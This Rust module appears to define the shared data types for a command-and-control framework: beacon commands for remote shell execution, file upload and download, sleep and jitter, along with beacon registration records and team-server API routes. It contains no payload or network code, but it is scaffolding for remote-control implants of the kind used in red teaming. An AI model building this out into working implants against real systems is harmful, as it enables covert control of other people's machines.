use serde::{Deserialize, Serialize};
use std::time::Duration;

/// Command types that can be issued to beacons
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum Command {
    Shell(String),
    Upload {
        data: String, // base64 encoded data
        destination: String,
    },
    Download {
        source: String,
    },
    Sleep {
        seconds: u64,
    },
    Jitter {
        percent: u8,
    },
    Terminate,
}

/// Response from a beacon after executing a command
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CommandResponse {
    pub id: String,
    pub beacon_id: String,
    pub result: CommandResult,
}

/// Result of a command execution
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum CommandResult {
    Success(String),
    Error(String),
    FileData(String), // base64 encoded file data
}

/// Task assigned to a beacon
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Task {
    pub id: String,
    pub beacon_id: String,
    pub command: Command,
    pub timestamp: u64,
}

/// Information about a beacon
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BeaconInfo {
    pub id: String,
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub ip: String,
    pub sleep_time: Duration,
    pub last_check_in: Option<u64>,
    pub terminated: bool,
}

/// Beacon registration message
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BeaconRegistration {
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub ip: String,
}

/// API routes for the Team Server
pub mod routes {
    pub const REGISTER: &str = "/register";
    pub const CHECK_IN: &str = "/check_in";
    pub const TASKS: &str = "/tasks";
    pub const RESPONSES: &str = "/responses";
    pub const BEACONS: &str = "/beacons";
    pub const GET_RESPONSES: &str = "/get_responses";
    pub const COMMAND_OUTPUT: &str = "/command_output";
}

/// Generate a random ID string
pub fn generate_id() -> String {
    use rand::{distributions::Alphanumeric, Rng};
    
    rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(10)
        .map(char::from)
        .collect()
}
